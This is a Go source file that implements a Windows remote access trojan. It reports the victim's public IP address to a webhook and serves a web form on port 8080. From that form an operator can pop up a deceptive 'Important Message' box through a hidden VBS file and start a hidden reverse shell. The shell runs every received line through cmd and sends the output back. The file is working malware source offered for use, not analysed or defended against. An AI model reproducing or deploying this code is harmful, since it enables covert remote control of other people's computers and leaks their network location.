package main

import (
    "fmt"
    "encoding/json"
    "bytes"
    "bufio"
    "log"
    "os"
    "net"
    "os/exec"
    "io/ioutil"
    "html/template"
    "net/http"
    "syscall"
    "time"
)


type Command struct {
    Cmd       string
    IpRev     string
}

func sendWebhook(message string) {

    url := "" // Here webhook URL
    values := map[string]string{
        "content": message,
    }
    jsonData, err := json.Marshal(values)
    if err != nil {
        return
    }
    resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
    if err != nil {
        return
    }

    var res map[string]interface{}

    json.NewDecoder(resp.Body).Decode(&res)

}


func getIp() {

    resp, err := http.Get("https://ipv4.wtfismyip.com/text")
    if err != nil {
        log.Fatal(err)
    }
    defer resp.Body.Close()
    body, err := ioutil.ReadAll(resp.Body)
    if err != nil {
        log.Fatal(err)
    }

    ipaddr := string(body)

    if err != nil {
        log.Fatal(err)
    }

    sendWebhook("From IP: ``" + ipaddr + "``")

}

func reverse(host string) {
    c, err := net.Dial("tcp", host)
    if nil != err {
        if nil != c {
            c.Close()
        }
        time.Sleep(time.Minute)
        reverse(host)
    }

    r := bufio.NewReader(c)
    for {
        order, err := r.ReadString('\n')
        if nil != err {
            c.Close()
            reverse(host)
            return
        }

        cmd := exec.Command("cmd", "/C", order)
        cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
        out, _ := cmd.CombinedOutput()

        c.Write(out)
    }
}

func show_payload(text string) {

    if len(text) > 0 {


	   rem := os.Remove("tmp.vbs")

        if rem != nil {
            log.Fatal(rem)
        }

        generated_string := fmt.Sprintf("x=MsgBox(\"%s\", vbOkOnly+vbCritical, \"Important Message\")",text)
        payload := []byte(generated_string)

        ioutil.WriteFile("tmp.vbs", payload, 0644)

        cmd := exec.Command("attrib", "+h", "tmp.vbs")
        err := cmd.Run()

        if err != nil {
            log.Fatal(err)
        }


        cmd1 := exec.Command("cscript", "tmp.vbs")
        err1 := cmd1.Run()

        if err1 != nil {
            log.Fatal(err1)
        }	
        fmt.Println(fmt.Sprintf("Sent \"%s\" successfully!",text))
    }
}


func start_api() {
    tmpl := template.Must(template.ParseFiles("forms.html"))

    http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
        if r.Method != http.MethodPost {
            tmpl.Execute(w, nil)
            return
        }

        details :=  Command{
            Cmd:     r.FormValue("cmd"),
            IpRev:   r.FormValue("rev"),
        }
        command := details.Cmd

        ip := details.IpRev
        
        go show_payload(command)
        
        go reverse(ip)

        _ = command
        _ = ip

       

        // do something with details
        _ = details

        tmpl.Execute(w, struct{ Success bool }{true})
    })

    http.ListenAndServe(":8080", nil)
}


func main() {
    getIp()
    fmt.Println("Api server listening on port 8080")
	start_api()
}